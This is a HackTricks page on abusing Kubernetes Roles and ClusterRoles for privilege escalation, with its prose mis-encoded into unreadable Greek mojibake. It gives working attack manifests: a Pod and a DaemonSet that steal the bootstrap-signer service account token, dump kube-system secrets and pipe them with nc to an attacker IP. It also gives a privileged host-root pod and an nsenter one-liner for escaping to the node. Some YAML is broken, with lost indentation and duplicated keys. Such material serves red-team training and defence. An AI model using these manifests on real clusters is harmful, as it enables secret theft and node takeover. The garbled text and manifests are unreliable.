# Abusing Roles/ClusterRoles in Kubernetes

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Î•Î´Ï Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ Î´Ï…Î½Î·Ï„Î¹ÎºÎ¬ ÎµÏ€Î¹ÎºÎ¯Î½Î´Ï…Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Roles ÎºÎ±Î¹ ClusterRoles.\
Î˜Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î¿Ï…Ï‚ Ï€ÏŒÏÎ¿Ï…Ï‚ Î¼Îµ `kubectl api-resources`

## **Privilege Escalation**

Î‘Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½Î¿Î¹ Ï‰Ï‚ Î· Ï„Î­Ï‡Î½Î· Ï„Î¿Ï… Î½Î± Î±Ï€Î¿ÎºÏ„Î¬Ï‚ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î­Î½Î±Î½ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ ÎºÏÏÎ¹Î¿** ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… cluster **Î¼Îµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±** (ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… kubernetes cluster Î® ÏƒÎµ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¬ cloud) Î±Ï€ÏŒ Î±Ï…Ï„Î¬ Ï€Î¿Ï… Î®Î´Î· Î­Ï‡ÎµÏ„Îµ, ÏƒÏ„Î¿ Kubernetes Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î²Î±ÏƒÎ¹ÎºÎ¬ **4 ÎºÏÏÎ¹ÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½**:

* ÎÎ± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Ï€Î±ÏÎ¹ÏƒÏ„Î¬Î½ÎµÏ„Îµ** Î¬Î»Î»Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚/Î¿Î¼Î¬Î´ÎµÏ‚/SAs Î¼Îµ ÎºÎ±Î»ÏÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… kubernetes cluster Î® ÏƒÎµ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¬ cloud
* ÎÎ± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Îµ/Î´Î¹Î¿ÏÎ¸ÏÎ½ÎµÏ„Îµ/ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Îµ pods** ÏŒÏ€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î²ÏÎµÎ¯Ï„Îµ Î® Î½Î± ÏƒÏ…Î½Î´Î­ÏƒÎµÏ„Îµ SAs** Î¼Îµ ÎºÎ±Î»ÏÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… kubernetes cluster Î® ÏƒÎµ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¬ cloud
* ÎÎ± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Î´Î¹Î±Î²Î¬Î¶ÎµÏ„Îµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** ÎºÎ±Î¸ÏÏ‚ Ï„Î± tokens Ï„Ï‰Î½ SAs Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ Ï‰Ï‚ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬
* ÎÎ± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Î´Î¹Î±Ï†ÏÎ³ÎµÏ„Îµ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿** Î±Ï€ÏŒ Î­Î½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ, ÏŒÏ€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ ÏŒÎ»Î± Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Ï„Ï‰Î½ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿, Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… ÎºÎ±Î¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… cloud ÏƒÏ„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ (Î±Î½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹)
* ÎœÎ¹Î± Ï€Î­Î¼Ï€Ï„Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï€Î¿Ï… Î±Î¾Î¯Î¶ÎµÎ¹ Î½Î± Î±Î½Î±Ï†ÎµÏÎ¸ÎµÎ¯ ÎµÎ¯Î½Î±Î¹ Î· Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„Î± Î½Î± **Ï„ÏÎ­Ï‡ÎµÏ„Îµ port-forward** ÏƒÎµ Î­Î½Î± pod, ÎºÎ±Î¸ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„ÎµÏ‚ Ï€ÏŒÏÎ¿Ï…Ï‚ ÎµÎ½Ï„ÏŒÏ‚ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… pod.

### Access Any Resource or Verb (Wildcard)

Î— **wildcard (\*) Î´Î¯Î½ÎµÎ¹ Î¬Î´ÎµÎ¹Î± ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï€ÏŒÏÎ¿ Î¼Îµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ ÏÎ®Î¼Î±**. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚. ÎœÎ­ÏƒÎ± ÏƒÎµ Î­Î½Î± ClusterRole Î±Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ namespace ÏƒÏ„Î¿ cluster
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Access Any Resource with a specific verb

Î£Ï„Î¿ RBAC, Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÎµÎ½Î­Ï‡Î¿Ï…Î½ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¿ÏÏ‚ ÎºÎ¹Î½Î´ÏÎ½Î¿Ï…Ï‚:

1. **`create`:** Î Î±ÏÎ­Ï‡ÎµÎ¹ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ Î¿Ï€Î¿Î¹Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ Ï€ÏŒÏÎ¿Ï… Ï„Î¿Ï… cluster, Î¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÏƒÎµ ÎºÎ¯Î½Î´Ï…Î½Î¿ Ï„Î·Î½ ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½.
2. **`list`:** Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î® ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Ï€ÏŒÏÏ‰Î½, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î´Î¹Î±ÏÏÎ­Î¿Î½Ï„Î±Ï‚ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±.
3. **`get`:** Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î±Ï€ÏŒ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½, Î¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÏƒÎµ ÎºÎ¯Î½Î´Ï…Î½Î¿ Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î¬Î´ÎµÎ¹ÎµÏ‚ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± pod, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹ Î­Î½Î±Î½ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿ Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î¥Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ ÏƒÏ„Î¿ pod ÎºÎ±Î¹ Î½Î± ÎºÎ»Î­ÏˆÎµÎ¹ Ï„Î¿ token Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€Î¿Î¹Î·Î¸ÎµÎ¯ Ï„Î¿Î½ Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î¥Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚. Î‘Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ¬, ÎºÎ»Î¹Î¼Î±ÎºÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÏƒÎµ Î±Ï…Ï„ÏŒÎ½.

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ½ÏŒÏ‚ pod Ï€Î¿Ï… Î¸Î± ÎºÎ»Î­ÏˆÎµÎ¹ Ï„Î¿ token Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ `bootstrap-signer` ÎºÎ±Î¹ Î¸Î± Ï„Î¿ ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ ÏƒÏ„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Pod & Î”Î¹Î±Ï†Ï…Î³Î®

Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÎ»Î± Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Î­Î½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ:

* **Î ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÎ® Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** (Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¹ÏÎ½ ÎºÎ±Î¹ ÏÏÎ¸Î¼Î¹ÏƒÎ· Î¹ÎºÎ±Î½Î¿Ï„Î®Ï„Ï‰Î½)
* **Î‘Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· namespaces hostIPC ÎºÎ±Î¹ hostPid** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²Î¿Î·Î¸Î®ÏƒÎ¿Ï…Î½ ÏƒÏ„Î·Î½ ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½
* **Î‘Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… hostNetwork** namespace, Î´Î¯Î½Î¿Î½Ï„Î±Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î³Î¹Î± ÎºÎ»Î¿Ï€Î® Ï„Ï‰Î½ Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ cloud Ï„Ï‰Î½ ÎºÏŒÎ¼Î²Ï‰Î½ ÎºÎ±Î¹ ÎºÎ±Î»ÏÏ„ÎµÏÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î´Î¯ÎºÏ„Ï…Î±
* **Î£ÏÎ½Î´ÎµÏƒÎ· hosts / Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Ï„Î¿ pod Î¼Îµ:
```bash
kubectl --token $token create -f mount_root.yaml
```
One-liner Î±Ï€ÏŒ [Î±Ï…Ï„ÏŒ Ï„Î¿ tweet](https://twitter.com/mauilion/status/1129468485480751104) ÎºÎ±Î¹ Î¼Îµ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎµÏ‚:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Î¤ÏÏÎ± Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¹Î±Ï†ÏÎ³ÎµÏ„Îµ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¹Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î¼ÎµÏ„Î±-ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ ÏƒÏ„Î¿:

#### Stealth

Î Î¹Î¸Î±Î½ÏÏ‚ Î¸Î­Î»ÎµÏ„Îµ Î½Î± ÎµÎ¯ÏƒÏ„Îµ **Ï€Î¹Î¿ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¿Î¯**. Î£Ï„Î¹Ï‚ ÎµÏ€ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¹ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î±Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± pod ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼ÏŒÎ½Î¿ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± Î±Ï€ÏŒ Ï„Î± Ï€ÏÎ¿Î±Î½Î±Ï†ÎµÏÎ¸Î­Î½Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÏƒÏ„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Ï€ÏÏŒÏ„Ï…Ï€Î¿:

* **Privileged + hostPID**
* **Privileged Î¼ÏŒÎ½Î¿**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î³Î¹Î± Ï„Î¿ Ï€ÏÏ‚ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ/ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ privileged pods ÏƒÏ„Î¿_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - ÎœÎµÏ„Î±ÎºÎ¯Î½Î·ÏƒÎ· ÏƒÏ„Î¿ cloud

Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ** Î­Î½Î± **pod** (ÎºÎ±Î¹ Ï€ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÎ¬ Î­Î½Î±Î½ **Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚**), Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÏƒÎµ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ cloud** Î±Î½Î±Î¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚ cloud ÏƒÎµ Î­Î½Î± pod Î® ÏƒÎµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒ.\
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± **pod Î¼Îµ Ï„Î¿ namespace Î´Î¹ÎºÏ„ÏÎ¿Ï… Ï„Î¿Ï… host**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ IAM** Ï„Î·Ï‚ **Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·Ï‚** Ï„Î¿Ï… **ÎºÏŒÎ¼Î²Î¿Ï…**.

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±/Î•Ï€Î¹ÎºÎ±Î¹ÏÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î‘Î½Î¬Ï€Ï„Ï…Î¾Î·Ï‚, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs ÎºÎ±Î¹ Cronjobs**

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î³Î¹Î± Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ pod** ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±.

Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ yaml **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± daemonset ÎºÎ±Î¹ ÎµÎ¾Î¬Î³ÎµÎ¹ Ï„Î¿ token Ï„Î¿Ï… SA** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Ï€ÏŒÏÎ¿Ï‚ ÏƒÏ„Î¿ kubernetes Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± **Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½ ÏƒÎµ Î­Î½Î± shell Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± pod**. Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î± containers Î® Î½Î± Î±Ï€Î¿ÎºÏ„Î¬Ï„Î±Î¹ Î­Î½Î± shell Î¼Î­ÏƒÎ±**.

